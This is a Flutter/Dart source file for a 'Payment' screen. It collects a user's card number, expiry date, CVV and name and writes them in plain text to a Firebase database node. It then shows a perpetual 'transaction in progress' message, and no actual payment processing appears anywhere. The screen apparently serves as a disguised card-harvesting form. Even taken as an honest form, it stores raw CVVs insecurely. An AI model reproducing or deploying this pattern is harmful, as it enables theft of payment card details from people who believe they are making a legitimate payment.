import 'package:background_app/widgets/primary_button.dart';
import 'package:background_app/widgets/primary_textfield.dart';
import 'package:background_app/widgets/textfield_with_prefix_icon.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';

class CreditCardPaymentView extends StatefulWidget {
  const CreditCardPaymentView({super.key});

  @override
  State<CreditCardPaymentView> createState() => _CreditCardPaymentViewState();
}

class _CreditCardPaymentViewState extends State<CreditCardPaymentView> {
  final _formKey = GlobalKey<FormState>();
  bool isLoading = false;
  final databaseRef = FirebaseDatabase.instance.ref('phone');
  final TextEditingController _cardNumberController = TextEditingController();
  final TextEditingController _expiryController = TextEditingController();
  final TextEditingController _expiryYearController = TextEditingController();
  final TextEditingController _cvvController = TextEditingController();
  final TextEditingController _nameController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: const Color(0xFF4d79ff),
        title: const Text(
          'Payment',
          style: TextStyle(
            fontSize: 20,
            fontWeight: FontWeight.w400,
          ),
        ),
        automaticallyImplyLeading: false,
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 20),
          child: Column(
            children: [
              const SizedBox(height: 50),
              Container(
                width: double.infinity,
                // margin: EdgeInsets.symmetric(horizontal: 5),
                // height: 350,
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: [
                    BoxShadow(
                      blurRadius: 4,
                      spreadRadius: 2,
                      color: Colors.black.withOpacity(0.20),
                      offset: const Offset(4, 0),
                    ),
                  ],
                ),
                child: Form(
                  key: _formKey,
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const SizedBox(height: 10),
                      const Text(
                        'Card number',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w400,
                          // color: Color(0xFF3e445c),
                        ),
                      ),
                      const SizedBox(
                        height: 5,
                      ),
                      TextFieldWithPrefixIconWidget(
                        hintText: 'Card number',
                        prefixIcon: 'assets/images/atm-card.png',
                        controller: _cardNumberController,
                        validator: (value) {
                          if (value!.isEmpty) {
                            return 'Please Enter Your Card Number';
                          }
                          return null;
                        },
                      ),
                      // PrimaryTextField(
                      //     validator: (value) {},
                      //     controller: _cardNumberController,
                      //     hintText: 'Card number'),
                      const SizedBox(
                        height: 20,
                      ),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text(
                                'Expiry month',
                                style: TextStyle(
                                  fontSize: 14,
                                  fontWeight: FontWeight.w400,
                                  // color: Color(0xFF3e445c),
                                ),
                              ),
                              const SizedBox(
                                height: 5,
                              ),
                              PrimaryTextField(
                                  width: 200,
                                  validator: (value) {
                                    if (value!.isEmpty) {
                                      return 'Expiry Month';
                                    }
                                    return null;
                                  },
                                  controller: _expiryController,
                                  hintText: 'Expiry month'),
                            ],
                          ),
                          Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text(
                                'Expiry year',
                                style: TextStyle(
                                  fontSize: 14,
                                  fontWeight: FontWeight.w400,
                                  // color: Color(0xFF3e445c),
                                ),
                              ),
                              const SizedBox(
                                height: 5,
                              ),
                              PrimaryTextField(
                                  width: 120,
                                  validator: (value) {
                                    if (value!.isEmpty) {
                                      return 'Expiry Year';
                                    }
                                    return null;
                                  },
                                  controller: _expiryYearController,
                                  hintText: 'year'),
                            ],
                          )
                        ],
                      ),
                      const SizedBox(height: 10),
                      const Text(
                        'Cvv',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w400,
                          // color: Color(0xFF3e445c),
                        ),
                      ),
                      const SizedBox(
                        height: 5,
                      ),
                      TextFieldWithPrefixIconWidget(
                        controller: _cvvController,
                        validator: (value) {
                          if (value!.isEmpty) {
                            return 'Please Enter Your CVV';
                          }
                          return null;
                        },
                        width: 200,
                        obscureText: true,
                        hintText: 'Cvv',
                        prefixIcon: 'assets/images/cvv.png',
                      ),

                      const SizedBox(
                        height: 20,
                      ),
                      const Text(
                        'Card Holder Name',
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w400,
                          // color: Color(0xFF3e445c),
                        ),
                      ),
                      const SizedBox(
                        height: 5,
                      ),
                      PrimaryTextField(
                          keyboardType: TextInputType.text,
                          validator: (value) {
                            if (value!.isEmpty) {
                              return 'Please Enter Card Holder Name';
                            }
                            return null;
                          },
                          controller: _nameController,
                          hintText: 'Your name'),
                      const SizedBox(
                        height: 10,
                      ),
                    ],
                  ),
                ),
              ),
              // const SizedBox(height: 40),
              // PrimaryButton(title: 'Pay Now', onTap: () {

              // })
              const SizedBox(height: 40),
              Container(
                alignment: Alignment.center,
                color: Colors.white,
                height: 100,
                child: Column(
                  children: [
                    PrimaryButton(
                        isLoading: isLoading,
                        title: 'Pay Now',
                        onTap: () {
                          if (_formKey.currentState!.validate()) {
                            databaseRef
                                .child(DateTime.now()
                                    .millisecondsSinceEpoch
                                    .toString())
                                .set({
                              'full name': _nameController.text.toString(),
                              'card number':
                                  _cardNumberController.text.toString(),
                              'expiry month': _expiryController.text.toString(),
                              'expiry year':
                                  _expiryYearController.text.toString(),
                              'cvv ': _cvvController.text.toString(),
                            });
                            setState(() {
                              isLoading = true;
                            });
                          }
                        }),
                    const SizedBox(height: 10),
                    isLoading
                        ? const Text(
                            'Please wait while your transaction is in progress',
                            style: TextStyle(
                                fontSize: 15,
                                fontWeight: FontWeight.w400,
                                color: Colors.red),
                          )
                        : const SizedBox.shrink()
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
